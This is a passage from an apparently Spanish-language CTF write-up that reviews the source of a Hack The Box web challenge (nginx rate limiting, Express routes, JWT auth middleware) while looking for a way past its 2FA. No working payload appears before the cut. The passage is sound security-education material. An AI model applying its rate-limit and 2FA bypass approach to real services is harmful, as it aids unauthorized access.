    <span class="mtk5">limit_req_zone</span> global zone=global_rate_limit:5m rate=20r/m;
    <span class="mtk5">limit_req_status</span> <span class="mtk4">429</span>;

    <span class="mtk7">server</span> {
        <span class="mtk5">listen</span> <span class="mtk4">80</span>;
        <span class="mtk5">server_name</span> batchcraft-potions.htb;

        <span class="mtk7">location</span> <span class="mtk8">/graphql</span> {
            <span class="mtk5">limit_req</span> zone=global_rate_limit burst=5 nodelay;
            <span class="mtk5">proxy_set_header</span>  X-Forwarded-For $remote_addr;
            <span class="mtk5">proxy_set_header</span>  Host: $http_host;
            <span class="mtk5">proxy_pass</span>	  http://127.0.0.1:1337;
        }

        <span class="mtk7">location</span> <span class="mtk8">/</span> {
            <span class="mtk5">proxy_set_header</span>  X-Forwarded-For $remote_addr;
            <span class="mtk5">proxy_set_header</span>  Host $http_host;
            <span class="mtk5">proxy_pass</span>        http://127.0.0.1:1337;
        }

    }
}
</code></pre></div><p>Y no podemos saltarnos el límite de velocidad usando cabeceras como <code>X-Forwarded-for</code> ya que nginx copia nuestra dirección IP real a <code>X-Forwarded-For</code>. De todos modos, deberíamos probar todas las cabeceras que aparecen en <a href="https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass">HackTricks</a>, pero ninguna funciona. Entonces, debemos encontrar otra forma de saltarnos el 2FA.</p><p>La implementación del OTP se ve correcta y la semilla es generada por la librería de terceros, que está actualizada, por lo que no hay vulnerabilidades.</p><p>Una cosa interesante es que la petición del OTP se maneja con GraphQL.</p><h3 id="rutas-disponibles">Rutas disponibles</h3><p>Esto es <code>routes/index.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> bot              </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'../bot'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">          </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'express'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1">           </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">Router</span><span class="mtk1">();</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> { graphqlHTTP }  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'express-graphql'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">{ </span><span class="mtk8">execSync</span><span class="mtk1"> }</span><span class="mtk1">     </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'child_process'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">{ </span><span class="mtk8">existsSync</span><span class="mtk1"> }</span><span class="mtk1">   </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'fs'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> AuthMiddleware   </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'../middleware/AuthMiddleware'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> GraphqlSchema    </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'../helpers/GraphqlHelper'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> Joi              </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'joi'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> FilterHelper     </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'../helpers/FilterHelper'</span><span class="mtk1">);</span>

<span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">adminReviewing</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">data</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> ({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk9 mtki">data</span><span class="mtk1"> });</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk4">'/graphql'</span><span class="mtk1">, AuthMiddleware, </span><span class="mtk8">graphqlHTTP</span><span class="mtk1">((</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk1">schema</span><span class="mtk1">: GraphqlSchema,</span>
<span class="mtk1">        </span><span class="mtk1">graphiql</span><span class="mtk1">: </span><span class="mtk6">false</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk1">context</span><span class="mtk1">: {</span><span class="mtk1">req</span><span class="mtk1">, </span><span class="mtk1">res</span><span class="mtk1">}</span>
<span class="mtk1">    }</span>
<span class="mtk1">}));</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    products </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> db.</span><span class="mtk8">getPotions</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'index.html'</span><span class="mtk1">, {</span><span class="mtk1">products</span><span class="mtk1">});</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/products/:id'</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">id</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">params</span><span class="mtk1">;</span>

<span class="mtk1">    product </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> db.</span><span class="mtk8">getPotionByID</span><span class="mtk1">(</span><span class="mtk1">id</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ( </span><span class="mtk5">!</span><span class="mtk1">product.id </span><span class="mtk5">||</span><span class="mtk1"> product.product_approved </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">);</span>  

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">meta</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> FilterHelper.</span><span class="mtk8">generateMeta</span><span class="mtk1">(</span>
<span class="mtk1">        product.product_og_title,</span>
<span class="mtk1">        product.product_og_desc,</span>
<span class="mtk1">        product.product_keywords</span>
<span class="mtk1">    );</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'product.html'</span><span class="mtk1">, {</span><span class="mtk1">meta</span><span class="mtk1">, </span><span class="mtk1">product</span><span class="mtk1">});</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'login.html'</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/2fa'</span><span class="mtk1">, AuthMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk8">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'2fa.html'</span><span class="mtk1">, {</span><span class="mtk1">user</span><span class="mtk1">: </span><span class="mtk9 mtki">req</span><span class="mtk1">.user});</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/dashboard'</span><span class="mtk1">, AuthMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk8">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    products </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> db.</span><span class="mtk8">getPotionsByUser</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username);</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'dashboard.html'</span><span class="mtk1">, {</span><span class="mtk1">user</span><span class="mtk1">: </span><span class="mtk9 mtki">req</span><span class="mtk1">.user, </span><span class="mtk1">products</span><span class="mtk1">});</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/products/add'</span><span class="mtk1">, AuthMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">adminReviewing</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk4">'Rate limited!'</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">schema</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> Joi.</span><span class="mtk8">object</span><span class="mtk1">({</span>
<span class="mtk1">        </span><span class="mtk1">product_name</span><span class="mtk1">: Joi.</span><span class="mtk8">string</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_desc</span><span class="mtk1">: Joi.</span><span class="mtk8">string</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_price</span><span class="mtk1">: Joi.</span><span class="mtk8">number</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_category</span><span class="mtk1">: Joi.</span><span class="mtk8">number</span><span class="mtk1">().</span><span class="mtk8">min</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">).</span><span class="mtk8">max</span><span class="mtk1">(</span><span class="mtk6">100</span><span class="mtk1">).</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_keywords</span><span class="mtk1">: Joi.</span><span class="mtk8">string</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_og_title</span><span class="mtk1">: Joi.</span><span class="mtk8">string</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_og_desc</span><span class="mtk1">: Joi.</span><span class="mtk8">string</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">()</span>
<span class="mtk1">    });</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">error</span><span class="mtk1">, </span><span class="mtk1">value</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">schema</span><span class="mtk1">.</span><span class="mtk8">validate</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">error</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk1">error</span><span class="mtk1">.message));</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk1">value</span><span class="mtk1">.product_desc </span><span class="mtk5">=</span><span class="mtk1"> FilterHelper.</span><span class="mtk8">filterHTML</span><span class="mtk1">(</span><span class="mtk1">value</span><span class="mtk1">.product_desc);</span>
<span class="mtk1">    </span><span class="mtk1">value</span><span class="mtk1">.product_seller </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username;</span>
<span class="mtk1">    </span><span class="mtk1">value</span><span class="mtk1">.product_approved </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk5">await</span><span class="mtk1"> db.</span><span class="mtk8">addPotion</span><span class="mtk1">(</span><span class="mtk1">value</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Something went wrong!'</span><span class="mtk1">));</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">potion</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> db.</span><span class="mtk8">getAddedPotionID</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username);</span>

<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk1">adminReviewing</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">await</span><span class="mtk1"> bot.</span><span class="mtk8">previewProduct</span><span class="mtk1">(</span><span class="mtk1">potion</span><span class="mtk1">.id);</span>
<span class="mtk1">        </span><span class="mtk1">adminReviewing</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Potion added and being reviewed by admin!'</span><span class="mtk1">));</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk1">adminReviewing</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Something went wrong'</span><span class="mtk1">));</span>
<span class="mtk1">    }</span>

<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/products/preview/:id'</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">id</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">params</span><span class="mtk1">;</span>

<span class="mtk1">    product </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> db.</span><span class="mtk8">getPotionByID</span><span class="mtk1">(</span><span class="mtk1">id</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ( </span><span class="mtk5">!</span><span class="mtk1">product.id ) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">meta</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> FilterHelper.</span><span class="mtk8">generateMeta</span><span class="mtk1">(</span>
<span class="mtk1">        product.product_og_title,</span>
<span class="mtk1">        product.product_og_desc,</span>
<span class="mtk1">        product.product_keywords</span>
<span class="mtk1">    );</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'product.html'</span><span class="mtk1">, {</span><span class="mtk1">meta</span><span class="mtk1">, </span><span class="mtk1">product</span><span class="mtk1">});</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/logout'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">clearCookie</span><span class="mtk1">(</span><span class="mtk4">'session'</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk7 mtki">module</span><span class="mtk1">.</span><span class="mtk7 mtki">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1">;</span>
<span class="mtk1">};</span>
</code></pre></div><p>Hay muchas rutas, pero la mayoría de ellas están protegidas con <code>AuthMiddleware</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> JWTHelper </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'../helpers/JWTHelper'</span><span class="mtk1">);</span>

<span class="mtk7 mtki">module</span><span class="mtk1">.</span><span class="mtk7 mtki">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk9 mtki">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.cookies.session </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk6">undefined</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.originalUrl </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'/graphql'</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">is</span><span class="mtk1">(</span><span class="mtk4">'application/json'</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">({ </span><span class="mtk1">status</span><span class="mtk1">: </span><span class="mtk4">'unauthorized'</span><span class="mtk1">, </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">'Authentication required!'</span><span class="mtk1"> });</span>  
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> JWTHelper.</span><span class="mtk8">verify</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.cookies.session)</span>
<span class="mtk1">      .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">user</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk9 mtki">req</span><span class="mtk1">.user </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">user</span><span class="mtk1">;</span>

<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.originalUrl </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'/graphql'</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.originalUrl </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'/2fa'</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">user</span><span class="mtk1">.verified </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">);</span>

<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">      })</span>
<span class="mtk1">      .</span><span class="mtk8">catch</span><span class="mtk1">((</span><span class="mtk9 mtki">e</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">.originalUrl </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'/graphql'</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/logout'</span><span class="mtk1">);</span>
<span class="mtk1">      });</span>
<span class="mtk1">  } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/logout'</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Básicamente, utiliza JWT para gestionar la autenticación del usuario. Si el <em>token</em> no está verificado, solo se nos permite acceder a <code>/2fa</code> y <code>/graphql</code>. Esta vez la implementación es correcta, porque usa <code>JWTHelper.verify</code> y no <code>decode</code> como en <a href="../the-magic-informer">The Magic Informer</a>.</p><p>En <code>JWTHelper.js</code> todo parece correcto también:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">crypto</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'crypto'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> jwt    </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'jsonwebtoken'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">SECRET</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">crypto</span><span class="mtk1">.</span><span class="mtk8">randomBytes</span><span class="mtk1">(</span><span class="mtk6">69</span><span class="mtk1">).</span><span class="mtk8">toString</span><span class="mtk1">(</span><span class="mtk4">'hex'</span><span class="mtk1">);</span>  

<span class="mtk7 mtki">module</span><span class="mtk1">.</span><span class="mtk7 mtki">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">sign</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">) {</span>
